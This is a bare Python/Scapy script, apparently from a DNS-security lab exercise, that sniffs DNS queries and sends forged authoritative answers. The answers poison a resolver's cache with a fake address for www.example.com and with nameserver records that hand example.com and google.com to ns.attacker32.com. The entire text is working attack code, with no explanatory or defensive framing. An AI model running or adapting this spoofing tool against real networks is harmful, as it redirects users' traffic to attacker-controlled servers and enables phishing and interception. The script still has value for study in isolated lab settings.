#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                       ttl=259200, rdata='1.2.3.5')

        NSsec1 = DNSRR(rrname='example.com', type='NS',
                       ttl=259200, rdata='ns.attacker32.com')
        NSsec2 = DNSRR(rrname='google.com', type='NS',
                       ttl=259200, rdata='ns.attacker32.com')

        Addsec = DNSRR(rrname='ns.attacker32.com', type='A',
                       ttl=259200, rdata='10.9.0.153')

        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=2, arcount=1,
                     an=Anssec, ns=NSsec1/NSsec2, ar=Addsec)

        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt, verbose=0)
        print(f"Spoofed reply sent to {pkt[IP].src}")

f = 'udp and src host 10.9.0.53 and dst port 53'
pkt = sniff(iface='br-328e72dc9f42', filter=f, prn=spoof_dns)